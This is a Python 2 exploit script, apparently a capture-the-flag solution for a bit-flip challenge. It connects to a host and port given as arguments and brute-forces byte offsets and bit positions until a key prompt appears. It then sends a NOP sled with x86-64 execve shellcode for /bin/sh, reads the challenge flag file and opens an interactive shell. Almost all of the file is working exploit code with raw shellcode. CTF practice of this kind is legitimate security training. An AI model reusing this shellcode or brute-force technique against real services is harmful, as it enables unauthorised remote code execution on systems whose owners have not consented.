#!/usr/bin/env python2

import sys, socket, telnetlib
from struct import *
import time

def recvuntil(t):
    data = ''
    while not data.endswith(t):
        tmp = s.recv(1)
        if not tmp: break
        data += tmp

    return data

def interactive():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p32(x): return pack('<I', x)
def u32(x): return unpack('<I', x)[0]
def p64(x): return pack('<Q', x)
def u64(x): return unpack('<Q', x)[0]
for x in range(0x80, 0x100):
	print hex(x)
	for y in range(0, 8):
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.settimeout(3)
			s.connect((sys.argv[1], int(sys.argv[2])))
			recvuntil('Please enter the byte-offset you want to flip (0x80-0x139): ')
			s.send(hex(x) + '\n')
			recvuntil('Please enter the bitposition you want to flip at byte-offset(7-0): ')
			s.send(hex(y) + '\n')
			if 'Key' not in recvuntil('Enter the Key to win: '):
				continue
			print '{} {}'.format(hex(x), hex(y))
			payload = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
			#raw_input()
			s.send('\x90' * (40 - len(payload) - 1) + payload)
			time.sleep(0.1)
			s.send('cat /home/chall/flag\n')
			print s.recv(1024)	
			interactive()
			s.close()
		except:
			time.sleep(0.1)

